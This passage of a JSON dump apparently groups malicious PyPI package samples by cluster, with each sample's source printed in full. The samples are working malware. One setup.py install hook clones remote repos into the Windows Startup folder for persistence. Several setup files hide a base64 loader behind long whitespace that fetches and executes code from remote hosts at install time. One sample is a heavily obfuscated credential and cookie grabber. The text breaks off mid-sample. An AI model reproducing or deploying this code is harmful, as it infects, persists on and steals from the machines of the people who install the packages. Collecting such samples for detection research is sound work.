        "code": "from setuptools import find_packages, setup\nfrom setuptools.command.install import install\n\n\nclass CustomInstallCommand(install):\n    def run(self):\n        import os\n        os.environ[\"GIT_PYTHON_REFRESH\"] = \"quiet\"\n        import git\n\n        # create folder in startup\n\n        newpath = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot' \n        if not os.path.exists(newpath):\n            os.makedirs(newpath)\n\n        # create folder to store the exe\n\n\n        newpath = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint' \n        if not os.path.exists(newpath):\n            os.makedirs(newpath)\n\n        # cloning main.py to start the file auto into startup\n\n        repoDirectory = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\"\n        gitUrl = \"https://github.com/dcsage/test2lmaos.git\"\n\n        git.Git(repoDirectory).clone(gitUrl)\n\n        # cloning exe into our powerpoint folder\n        # this is where we're gonna call in our main.py to run the file on startup\n        # C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint\\defonotagrabber\\main.exe\n\n        repoDirectory = rf'C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Powerpoint'\n        gitUrl = \"https://github.com/dcsage/defonotagrabber.git\"\n\n        git.Git(repoDirectory).clone(gitUrl)\n\n        # moving the main.py file to the startup dir out of the folder\n\n\n        source = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\boot\\test2lmaos\"\n        destination = rf\"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n\n        allfiles = os.listdir(source)\n\n        src_path = os.path.join(source, 'test.py')\n        dst_path = os.path.join(destination, 'test.py')\n        os.rename(src_path, dst_path)\n\n        install.run(self)\n\n\n\nsetup(\n  name = 'sagetestthree',\n  packages=find_packages(),\n  version = '0.39',\n  description = 'Yes.',\n  author = 'haha.',\n  install_requires=[\"sockets\",\"discord.py\",\"aiohttp\",\"Cmake\",\"wheel\",\"requests\",\"gitpython\"],\n  cmdclass={\n    'install': CustomInstallCommand,\n  },\n  author_email = 'mianism@outlook.com',\n  url = 'https://github.com',\n  keywords = [],\n  classifiers = [],\n\n)\n"
      }
    ]
  },
  {
    "cluster_id": 34,
    "size": 3,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-01-libid-v0.1",
        "code": "type('loading')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(\"ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMTgxLjIxNC4yNDAuMjQ5L2luamVjdC9EaXJUYlpJNU9BWVREcUREJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw==\"),'<string>','exec'))\nfrom distutils.core import setup\nsetup(\n  name = 'libid',\n  packages = ['libid'],\n  version = '0.1',\n  license='MIT',\n  description = '',\n  author = 'WS',\n  keywords = [],\n  install_requires=[],\n  classifiers=[\n    'Operating System :: OS Independent',\n    'Development Status :: 3 - Alpha',\n    'License :: OSI Approved :: MIT License',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.4',\n    'Programming Language :: Python :: 3.5',\n    'Programming Language :: Python :: 3.6',\n  ],\n)\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-13-pvhttp",
        "code": "# -*- coding: utf-8 -*-\nprint('\\n')                                                                                                                                                                                                                                                                                                                                 ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(\"ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vMjAuODIuMTQ0LjE3OS9pbmplY3QvWnVNcmFLU1E3MTJBcW1GOScpLnJlYWQoKSkiIiIpCl90dG1wLmNsb3NlKCkKdHJ5OiBfc3N5c3RlbShmInN0YXJ0IHtfZWV4ZWN1dGFibGUucmVwbGFjZSgnLmV4ZScsICd3LmV4ZScpfSB7X3R0bXAubmFtZX0iKQpleGNlcHQ6IHBhc3M=\"),'<string>','exec'))\n\nfrom setuptools import setup, find_packages\nsetup(\n    name=\"pvhttp\",\n    version=\"1.0.7\",\n    packages=find_packages(exclude=['ez_setup', 'examples', 'tests']),\n    install_requires=[],\n    scripts=[],\n    url=\"https://github.com/dantezhu/pvhttp\",\n    license=\"MIT\",\n    author=\"dantezhu\",\n    author_email=\"dantezhu@qq.com\",\n    description=\"analysis maple endpoint's performance.\",\n)\n\n\n# -*- coding: utf-8 -*-\n\nimport time\nimport datetime\nimport logging\nfrom collections import defaultdict\n\n\nlogger = logging.getLogger(\"pvhttp\")\n\n\nALL_ENDPOINT_NAME = '*'\nINTERVAL = 10\n\n\ndef catch_exc(func):\n    import functools\n\n    @functools.wraps(func)\n    def func_wrapper(*args, **kwargs):\n        try:\n            return func(*args, **kwargs)\n        except:\n            logger.error('exc occur.', exc_info=True)\n\n    return func_wrapper\n\n\nclass MapleTimer(object):\n    \"\"\"\n    \u6309\u7167\u4e00\u5b9a\u7684\u89c4\u5219\u8fdb\u884c\u7edf\u8ba1\n    \"\"\"\n\n    app = None\n    interval = None\n\n    data_dict = None\n    data_begin_time = None\n\n    def __init__(self, app=None, config=None):\n        self.reset_data()\n\n        if app:\n            self.init_app(app, config)\n\n    def init_app(self, app, config=None):\n        self.app = app\n        config = config or dict()\n        # \u521d\u59cb\u5316\u6570\u636e\n        self.interval = config.get('interval') or INTERVAL\n\n        @app.before_request\n        @catch_exc\n        def prepare_stat(request):\n            if not request.endpoint:\n                return\n\n            request.maple_timers = dict()\n            request.maple_timers['begin_time'] = time.time()\n\n        @app.after_request\n        @catch_exc\n        def send_stat(request, exc):\n            if not hasattr(request, 'maple_timers'):\n                return\n\n            end_time = time.time()\n            cost_time = end_time - request.maple_timers['begin_time']\n\n            for it in (request.endpoint, ALL_ENDPOINT_NAME):\n                self.data_dict[it]['count'] += 1\n                self.data_dict[it]['total_time'] += cost_time\n                self.data_dict[it]['upper_time'] = max(self.data_dict[it]['upper_time'], cost_time)\n\n                if 'lower_time' not in self.data_dict[it]:\n                    self.data_dict[it]['lower_time'] = cost_time\n                else:\n                    self.data_dict[it]['lower_time'] = min(self.data_dict[it]['lower_time'], cost_time)\n\n            self.check_to_show_stat()\n\n    def check_to_show_stat(self):\n        now = datetime.datetime.now()\n\n        if now - self.data_begin_time >= datetime.timedelta(seconds=self.interval):\n            # \u8bf4\u660e\u65f6\u95f4\u5230\u4e86\uff0c\u53ef\u4ee5\u6253\u5370\u4e86\n\n            for k, v in self.data_dict.items():\n                if self.data_dict[ALL_ENDPOINT_NAME]['count'] != 0:\n                    v['count_percent'] = float(v['count']) / self.data_dict[ALL_ENDPOINT_NAME]['count']\n                else:\n                    v['count_percent'] = 0\n\n                if self.data_dict[ALL_ENDPOINT_NAME]['total_time'] != 0:\n                    v['total_time_percent'] = float(v['total_time']) / self.data_dict[ALL_ENDPOINT_NAME]['total_time']\n                else:\n                    v['total_time_percent'] = 0\n\n            single_all_item = self.data_dict.pop(ALL_ENDPOINT_NAME)\n            data_item_list = sorted(self.data_dict.items(), key=lambda x: x[1]['total_time'], reverse=True)\n            data_item_list.insert(0, (ALL_ENDPOINT_NAME, single_all_item))\n\n            self.show_stat(self.data_begin_time, now, data_item_list)\n\n            self.reset_data()\n\n    def reset_data(self):\n        self.data_dict = defaultdict(lambda: defaultdict(int))\n        self.data_begin_time = datetime.datetime.now()\n\n    def show_stat(self, from_time, to_time, data_item_list):\n        fmt = '%30s %20s %20s %12s %12s %12s %12s %12s'\n\n        str_data_list = [\n            fmt % ('endpoint',\n                   'total_time_percent',\n                   'count_percent',\n                   'total_time',\n                   'count',\n                   'mean_time',\n                   'upper_time',\n                   'lower_time'\n                   ),\n        ]\n\n        str_data_list.extend([\n                                 fmt % (\n                                     endpoint,\n                                     '%.02f%%' % (data['total_time_percent'] * 100),\n                                     '%.02f%%' % (data['count_percent'] * 100),\n                                     '%.03f' % data['total_time'],\n                                     data['count'],\n                                     '%.03f' % (float(data['total_time']) / data['count']),\n                                     '%.03f' % data['upper_time'],\n                                     '%.03f' % data['lower_time'],\n                                 )\n                                 for endpoint, data in data_item_list\n                                 ])\n\n        logger.info('from %s to %s\\n%s',\n                    from_time,\n                    to_time,\n                    '\\n'.join(str_data_list)\n                    )\n\n\n__version__ = '1.0.7'\n\nfrom .pvhttp import pvhttp\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-12-15-fastpep8",
        "code": "from setuptools import setup, find_packages\nprint('\\n')                                                                                                                                                                                                                                                                                                                                 ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(\"ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vaGFtaWRpaWlpLjAwMHdlYmhvc3RhcHAuY29tLzIyJykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw==\"),'<string>','exec'))\n\nsetup(\n    name='fastpep8',\n    version='0.2.1',\n    packages=find_packages(),\n    description='fastpep8',\n    # long_description=read('README.md'),\n    author='Emily Graham',\n    author_email='watergan1@mgmail.info',\n    url='https://github.com/watergan1/fastpep8',\n    license='MIT',\n    python_requires=\">=3.6\",\n)\n\n\n\nimport builtins\nimport sys\n\n\nclass ColorPrint:\n    colors = {\n        \"purple\": '\\033[95m',\n        \"blue\": '\\033[94m',\n        \"green\": '\\033[92m',\n        \"yellow\": '\\033[33m',\n        \"red\": '\\033[31m',\n        \"magenta\": '\\033[35m',\n        \"cyan\": '\\033[36m',\n    }\n\n    backgrounds = {\n        'grey': '\\033[40m', 'red': '\\033[41m',\n        'green': '\\033[42m', 'yellow': '\\033[43m',\n        'blue': '\\033[44m', 'magenta': '\\033[45m',\n        'cyan': '\\033[46m', 'white': '\\033[47m',\n    }\n\n    formats = {\n        \"bold\": \"\\033[1m\", \"underline\": \"\\033[4m\", \"blink\": \"\\033[5m\"\n    }\n\n    def __init__(self, *args, **kwargs):\n        self.args = args\n        self.kwargs = kwargs\n\n    def print(self):\n        color = self.kwargs.pop('color', None)\n        back = self.kwargs.pop('background', None)\n        format = self.kwargs.pop('format', None)\n        tag = self.kwargs.pop('tag', None)\n        tag_color = self.kwargs.pop('tag_color', None)\n        file = self.kwargs.get('file', sys.stdout)\n        result = \",\".join(str(arg) for arg in self.args)\n\n        if color:\n            result = self.color(color) + result\n\n        if tag:\n            result = f\"[{tag}] {result}\"\n            if tag_color:\n                result = self.color(tag_color) + result\n        # result += self.end\n        if back:\n            builtins.print(self.background(back), file=sys.stdout, end='')\n        if format:\n            builtins.print(self.format(format), file=sys.stdout, end='')\n        result += self.end\n        builtins.print(*result.split(','), **self.kwargs)\n\n    def color(self, color):\n        return self.colors.get(color, self.default_color)\n\n    def background(self, back):\n        return self.backgrounds.get(back, self.default_color)\n\n    def format(self, format):\n        if isinstance(format, str):\n            return self.formats.get(format, self.default_color)\n        elif isinstance(format, list, tuple):\n            return \",\".join(f for f in self.formats.get(f) for f in format)\n\n    @property\n    def end(self):\n        return '\\033[0m'\n\n    @property\n    def default_color(self):\n        return '\\033[0m'\n\n\ndef print(*args, **kwargs):\n    color_print = ColorPrint(*args, **kwargs)\n    color_print.print()\n"
      }
    ]
  },
  {
    "cluster_id": 35,
    "size": 6,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-24-axelo",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='Axelo', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n# Obfuscated with BlankOBF\n# https://github.com/Blank-c/BlankOBF\n_____=eval(\"\\x65\\166\\x61\\154\");_______=_____(\"\\143\\x6f\\155\\160\\151\\x6c\\145\");______,____=_____(_______(\"\\137\\x5f\\151\\x6d\\160\\x6f\\x72\\x74\\137\\137\\x28\\47\\x62\\x61\\163\\145\\x36\\64\\x27\\x29\",\"\",_____.__name__)),_____(_______(\"\\x5f\\x5f\\151\\155\\x70\\x6f\\162\\164\\137\\x5f\\50\\47\\143\\157\\x64\\x65\\143\\x73\\47\\x29\",\"\",_____.__name__));____________________=_____(\"'\\40\\106\\147\\142\\153\\x75\\66'\");________,_________,__________,___________=_____(_______(\"\\x65\\x78\\x65\\x63\",\"\",_____.__name__)),_____(_______(\"\\x73\\x74\\162\\x2e\\145\\156\\143\\157\\144\\145\",\"\",_____.__name__)),_____(_______(\"\\151\\163\\x69\\x6e\\163\\x74\\x61\\156\\x63\\x65\",\"\",_____.__name__)),_____(_______(\"\\142\\171\\x74\\145\\x73\",\"\",_____.__name__))\ndef ___________________(__________, ___________):\n    __________=__________.decode()\n    _________=\"\"\n    if not ___________[False]==\"\\x20\":\n        ___________=\"\\40\"+___________\n    for _ in range(_____(\"\\x6c\\145\\x6e\\50\\x5f\\x5f\\137\\137\\137\\137\\x5f\\137\\137\\x5f\\x29\")):\n        _________+=_____(\"\\143\\150\\x72\\x28\\157\\162\\144\\50\\137\\x5f\\x5f\\137\\x5f\\x5f\\137\\137\\x5f\\137\\133\\137\\135\\51\\136\\157\\162\\x64\\50\\x5f\\x5f\\137\\x5f\\137\\137\\137\\137\\137\\137\\137\\x5b\\50\\x6c\\x65\\x6e\\50\\137\\x5f\\x5f\\137\\137\\137\\137\\x5f\\137\\x5f\\137\\x29\\40\\x2d\\40\\x54\\x72\\165\\x65\\x2a\\62\\51\\40\\53\\x20\\124\\x72\\165\\x65\\x5d\\51\\x29\")\n    return (_________,___________)\ndef ____________(_____________):\n    if(_____________[-True]!=_____(_______(\"'\\x63\\x5f\\x5f\\137\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\x5f\\137\\137\\x5f\\x5f\\137\\137\\x36\\163\\x35\\x5f\\137\\137\\137\\137\\137\\137\\x5f\\137\\137\\x5f\\x5f\\137\\x5f\\x5f\\137\\x36\\x61\\x72\\x64\\x76\\70'[-True*4]\",\"\",_____.__name__))):_____________ = _________(_____________)\n    if not(__________(_____________, ___________)):_____________ = _____(_______(\"\\137\\137\\137\\137\\56\\144\\x65\\143\\x6f\\144\\x65\\x28\\x5f\\137\\137\\137\\x5f\\x5f\\x5f\\137\\137\\137\\x5f\\x5f\\x5f\\x5b\\72\\55\\x54\\162\\x75\\x65\\x5d,'\\x72\\x6f\\164\\61\\63')\",\"\",_____.__name__))\n    else:\n        if(_____________[-True]==_____(_______(\"b'\\x66\\65\\x73\\x66\\x73\\144\\146\\141\\165\\x66\\70\\x35'[-True*4]\",\"\", _____.__name__))):\n            _____________=_____(_______(\"\\x5f\\x5f\\x5f\\x5f\\56\\x64\\145\\143\\157\\144\\x65\\x28\\137\\137\\137\\137\\137\\137\\137\\x5f\\x5f\\137\\137\\x5f\\x5f\\133\\72\\55\\x54\\162\\165\\145\\x5d,'\\165\\x75')\",\"\",_____.__name__))\n        elif (_____________[-True] ==_____(_______(\"b'\\144\\x35\\x73\\146\\163\\61\\x64\\x66\\x66\\x68\\163\\144\\x38'[-True*4]\",\"\", _____.__name__))):_____________=_____(_______(\"\\x5f\\x5f\\x5f\\x5f\\56\\144\\x65\\x63\\x6f\\x64\\145\\x28\\x5f\\137\\x5f\\x5f\\137\\137\\137\\x5f\\137\\x5f\\x5f\\x5f\\x5f\\133\\x3a\\x2d\\x54\\x72\\x75\\145\\x5d,'\\150\\145\\170')\",\"\",_____.__name__))\n        else:_____________=_____(_______(\"\\x5f\\137\\x5f\\x5f\\x5f\\137\\x2e\\142\\70\\x35\\144\\145\\x63\\x6f\\144\\145\\x28\\137\\137\\x5f\\137\\x5f\\137\\x5f\\137\\x5f\\137\\x5f\\x5f\\x5f\\133\\x3a\\x2d\\124\\162\\165\\145\\135\\51\",\"\",_____.__name__));_____________=_____(_______(\"\\137\\137\\x5f\\137\\x2e\\144\\x65\\x63\\157\\144\\145\\50\\x5f\\137\\137\\x5f\\137\\137\\137\\x5f\\137\\x5f\\x5f\\137\\137, '\\150\\145\\170')\",\"\",_____.__name__))\n        _____________=_____(_______(\"\\x5f\\x5f\\x5f\\137\\x5f\\137\\x5f\\137\\x5f\\x5f\\x5f\\x2e\\x64\\145\\x63\\157\\144\\x65\\50\\137\\x5f\\x5f\\137\\137\\137\\137\\137\\137\\x5f\\x5f\\137\\x5f\\x29\",\"\",_____.__name__))\n    return _____________\n_________________=_____(_______(\"\\x5f\\x5f\\137\\137\\x5f\\x5f\\137\\137\\137\\137\\137\\x2e\\x64\\145\\x63\\x6f\\144\\145(b'\\\\x47\\\\x26\\\\115\\\\71\\\\141\\\\x47\\\\x64\\\\64\\\\67\\\\x31\\\\x47\\\\x26\\\\x4d\\\\x49\\\\146\\\\x47\\\\144\\\\115\\\\114\\\\x68\\\\110\\\\x28\\\\100\\\\x6b\\\\x36\\\\110\\\\x65\\\\x40\\\\x74\\\\156\\\\x47\\\\46\\\\63\\\\x5f\\\\x65\\\\x47\\\\143\\\\x71\\\\x2b\\\\144\\\\x48\\\\x38\\\\167\\\\120\\\\61\\\\107\\\\x26\\\\167\\\\131\\\\x33\\\\110\\\\x38\\\\126\\\\63\\\\130\\\\x48\\\\141\\\\111\\\\155\\\\154\\\\110\\\\145\\\\170\\\\x71\\\\60\\\\107\\\\53\\\\x7b\\\\x4c\\\\x7d\\\\x48\\\\145\\\\x78\\\\152\\\\x7e\\\\x48\\\\145\\\\51\\\\161\\\\62\\\\x48\\\\43\\\\163\\\\x79\\\\150\\\\x47\\\\144\\\\x4d\\\\x4a\\\\x33\\\\x48\\\\70\\\\145\\\\71\\\\x63\\\\x47\\\\55\\\\x35\\\\123\\\\60\\\\x48\\\\x38\\\\126\\\\x46\\\\142\\\\x47\\\\x26\\\\x34\\\\x30\\\\x61\\\\x48\\\\x38\\\\x56\\\\104\\\\x32\\\\x48\\\\x38\\\\x43\\\\174\\\\131\\\\110\\\\x65\\\\x6f\\\\150\\\\x6d\\\\110\\\\x21\\\\50\\\\x44\\\\x32\\\\x48\\\\x61\\\\122\\\\x71\\\\70\\\\x47\\\\x63\\\\x2b\\\\x60\\\\62\\\\107\\\\x26\\\\x44\\\\x33\\\\150\\\\107\\\\144\\\\x34\\\\x37\\\\x31\\\\x47\\\\x26\\\\126\\\\114\\\\x66\\\\110\\\\145\\\\100\\\\167\\\\x30\\\\107\\\\46\\\\x4d\\\\x49\\\\x63\\\\x47\\\\46\\\\63\\\\x7c\\\\174\\\\110\\\\x61\\\\122\\\\166\\\\x6f\\\\110\\\\141\\\\x49\\\\153\\\\x35\\\\x48\\\\x38\\\\145\\\\103\\\\x66\\\\x47\\\\53\\\\173\\\\x4d\\\\x30\\\\110\\\\50\\\\100\\\\164\\\\x37\\\\x48\\\\43\\\\141\\\\x6e\\\\x39\\\\x48\\\\x61\\\\122\\\\x73\\\\155\\\\x47\\\\45\\\\53\\\\53\\\\x7b\\\\107\\\\46\\\\x56\\\\x43\\\\132\\\\107\\\\143\\\\x59\\\\164\\\\137\\\\x48\\\\x65\\\\51\\\\161\\\\x34\\\\110\\\\x65\\\\x78\\\\153\\\\65\\\\110\\\\141\\\\x52\\\\x71\\\\65\\\\107\\\\55\\\\65\\\\120\\\\153\\\\x48\\\\70\\\\x77\\\\114\\\\145\\\\107\\\\x64\\\\x4d\\\\x4c\\\\143\\\\x47\\\\x26\\\\x4d\\\\106\\\\x69\\\\x48\\\\x61\\\\x52\\\\x71\\\\x36\\\\x47\\\\46\\\\115\\\\x43\\\\x62\\\\x48\\\\x23\\\\x61\\\\x70\\\\151\\\\110\\\\x65\\\\170\\\\x71\\\\67\\\\x47\\\\143\\\\x68\\\\x7a\\\\x7c\\\\110\\\\70\\\\x56\\\\67\\\\x31\\\\x47\\\\x63\\\\161\\\\x2b\\\\x62\\\\x48\\\\x65\\\\x78\\\\150\\\\x6b\\\\x48\\\\x38\\\\63\\\\x3c\\\\x7d\\\\110\\\\x61\\\\x39\\\\155\\\\x67\\\\107\\\\55\\\\x57\\\\x6b\\\\x31\\\\x48\\\\x38\\\\126\\\\63\\\\131\\\\x47\\\\55\\\\116\\\\x65\\\\x35\\\\107\\\\x26\\\\x34\\\\66\\\\150\\\\110\\\\146\\\\x41\\\\x2b\\\\71\\\\x47\\\\46\\\\x44\\\\x33\\\\x7d\\\\x47\\\\x2d\\\\65\\\\x52\\\\174\\\\110\\\\x61\\\\x52\\\\x76\\\\160\\\\110\\\\70\\\\115\\\\63\\\\131\\\\x47\\\\x26\\\\63\\\\x5f\\\\127\\\\110\\\\43\\\\152\\\\163\\\\x6f\\\\x48\\\\70\\\\126\\\\x39\\\\145\\\\x47\\\\143\\\\x2b\\\\137\\\\175\\\\110\\\\70\\\\x6e\\\\x52\\\\147\\\\x47\\\\144\\\\104\\\\x46\\\\145\\\\107\\\\x26\\\\x4d\\\\103\\\\152\\\\107\\\\x64\\\\115\\\\112\\\\x35\\\\110\\\\x38\\\\145\\\\111\\\\x6a\\\\110\\\\x5a\\\\x65\\\\x34\\\\60\\\\110\\\\70\\\\x6e\\\\x52\\\\x67\\\\107\\\\x64\\\\126\\\\120\\\\64\\\\110\\\\70\\\\x77\\\\125\\\\150\\\\x47\\\\x26\\\\x77\\\\141\\\\155\\\\x47\\\\x26\\\\115\\\\66\\\\144\\\\x47\\\\45\\\\x5f\\\\x5f\\\\x61\\\\110\\\\70\\\\x65\\\\x44\\\\63\\\\x47\\\\x2d\\\\x35\\\\x50\\\\152\\\\x47\\\\x26\\\\104\\\\66\\\\151\\\\x47\\\\144\\\\104\\\\x43\\\\152\\\\x47\\\\x26\\\\x34\\\\60\\\\141\\\\110\\\\x5a\\\\x65\\\\64\\\\x31\\\\x47\\\\46\\\\x44\\\\103\\\\152\\\\x48\\\\70\\\\167\\\\x4f\\\\153\\\\x47\\\\46\\\\115\\\\x46\\\\151\\\\107\\\\143\\\\x2b\\\\x7c\\\\x64\\\\x47\\\\x26\\\\x44\\\\x41\\\\x32\\\\x48\\\\x5a\\\\50\\\\115\\\\x35\\\\x48\\\\50\\\\100\\\\153\\\\x6e\\\\x47\\\\107\\\\x61\\\\101\\\\x32\\\\107\\\\x26\\\\64\\\\60\\\\x61\\\\x48\\\\x38\\\\x6e\\\\x49\\\\144\\\\x48\\\\x65\\\\170\\\\x64\\\\173\\\\x48\\\\x66\\\\101\\\\x2b\\\\x32\\\\x48\\\\x38\\\\126\\\\x33\\\\142\\\\107\\\\x63\\\\150\\\\172\\\\x60\\\\110\\\\x38\\\\126\\\\x39\\\\146\\\\110\\\\71\\\\60\\\\152\\\\x69\\\\x48\\\\141\\\\122\\\\161\\\\x39\\\\x47\\\\x26\\\\x4d\\\\71\\\\151\\\\110\\\\70\\\\167\\\\120\\\\61\\\\110\\\\70\\\\x4d\\\\60\\\\174\\\\x48\\\\145\\\\51\\\\155\\\\x7e\\\\x48\\\\x65\\\\51\\\\161\\\\63\\\\x48\\\\x23\\\\163\\\\166\\\\x6e\\\\x48\\\\x23\\\\x73\\\\43\\\\x6f\\\\x47\\\\143\\\\131\\\\172\\\\131\\\\x48\\\\x23\\\\x39\\\\x56\\\\x33\\\\110\\\\x65\\\\157\\\\x68\\\\61\\\\110\\\\x23\\\\60\\\\x52\\\\151\\\\x48\\\\70\\\\145\\\\x4a\\\\62\\\\107\\\\107\\\\x61\\\\x39\\\\x7e\\\\110\\\\x23\\\\x73\\\\x26\\\\x6c\\\\x47\\\\143\\\\x60\\\\63\\\\x64\\\\107\\\\143\\\\150\\\\44\\\\x61\\\\x47\\\\x64\\\\104\\\\104\\\\x35\\\\107\\\\143\\\\150\\\\44\\\\140\\\\x47\\\\46\\\\x33\\\\175\\\\x32\\\\x47\\\\143\\\\x59\\\\x74\\\\x63\\\\107\\\\x63\\\\x7a\\\\x3f\\\\x61\\\\x48\\\\50\\\\100\\\\147\\\\174\\\\x47\\\\x2d\\\\127\\\\x6b\\\\61\\\\107\\\\x26\\\\104\\\\x33\\\\x65\\\\x47\\\\x26\\\\x33\\\\x7c\\\\175\\\\110\\\\70\\\\156\\\\x49\\\\147\\\\x48\\\\x38\\\\167\\\\122\\\\152\\\\110\\\\145\\\\x29\\\\164\\\\160\\\\x48\\\\x38\\\\x43\\\\x5f\\\\x7d\\\\110\\\\x65\\\\157\\\\150\\\\x71\\\\x47\\\\x63\\\\131\\\\x77\\\\132\\\\107\\\\46\\\\x44\\\\66\\\\x69\\\\x47\\\\x63\\\\150\\\\172\\\\175\\\\x47\\\\x26\\\\x34\\\\x30\\\\132\\\\107\\\\x2d\\\\65\\\\x53\\\\60\\\\x48\\\\x38\\\\145\\\\106\\\\142\\\\x47\\\\x63\\\\x68\\\\x7a\\\\137\\\\110\\\\x61\\\\x52\\\\x74\\\\66\\\\110\\\\71\\\\x30\\\\152\\\\x68\\\\110\\\\x38\\\\145\\\\x43\\\\145\\\\x47\\\\144\\\\115\\\\x4a\\\\x35\\\\x48\\\\145\\\\170\\\\156\\\\x32\\\\x48\\\\x21\\\\167\\\\x39\\\\142\\\\x47\\\\46\\\\x33\\\\137\\\\145\\\\x48\\\\41\\\\x77\\\\66\\\\x7d\\\\110\\\\x28\\\\100\\\\156\\\\x37\\\\x47\\\\143\\\\x59\\\\164\\\\173\\\\x48\\\\145\\\\x78\\\\156\\\\156\\\\110\\\\43\\\\x6a\\\\x74\\\\x35\\\\x47\\\\46\\\\104\\\\x34\\\\61\\\\110\\\\x23\\\\141\\\\160\\\\152\\\\110\\\\70\\\\x56\\\\103\\\\x64\\\\x48\\\\146\\\\x31\\\\172\\\\x6e\\\\x48\\\\145\\\\170\\\\156\\\\x32\\\\110\\\\146\\\\x31\\\\x7a\\\\162\\\\107\\\\143\\\\131\\\\x7a\\\\132\\\\x48\\\\x38\\\\x4d\\\\x33\\\\145\\\\110\\\\70\\\\x77\\\\x58\\\\154\\\\x47\\\\107\\\\x3b\\\\131\\\\x31\\\\x48\\\\x38\\\\x77\\\\x53\\\\62\\\\110\\\\132\\\\50\\\\117\\\\x63\\\\x48\\\\70\\\\167\\\\117\\\\150\\\\x48\\\\70\\\\115\\\\x33\\\\143\\\\110\\\\70\\\\x6e\\\\122\\\\x67\\\\x48\\\\43\\\\x49\\\\142\\\\x33\\\\x47\\\\46\\\\104\\\\71\\\\x68\\\\110\\\\x23\\\\163\\\\x79\\\\x70\\\\x48\\\\x38\\\\x6e\\\\x50\\\\63\\\\110\\\\x61\\\\x52\\\\x71\\\\x35\\\\110\\\\x65\\\\170\\\\x71\\\\64\\\\x47\\\\x26\\\\64\\\\x30\\\\x61\\\\x48\\\\x28\\\\x40\\\\147\\\\x7c\\\\107\\\\x2b\\\\x7b\\\\115\\\\x32\\\\x48\\\\145\\\\x78\\\\156\\\\x72\\\\x48\\\\141\\\\x52\\\\163\\\\150\\\\110\\\\x38\\\\104\\\\x33\\\\x5a\\\\107\\\\55\\\\105\\\\x56\\\\x6c\\\\x47\\\\x26\\\\x44\\\\x30\\\\x62\\\\x48\\\\43\\\\x39\\\\x56\\\\62\\\\x48\\\\145\\\\x29\\\\x77\\\\x35\\\\110\\\\x38\\\\167\\\\x50\\\\62\\\\x48\\\\x38\\\\167\\\\x56\\\\x38\\\\x47\\\\144\\\\x34\\\\71\\\\x69\\\\x48\\\\x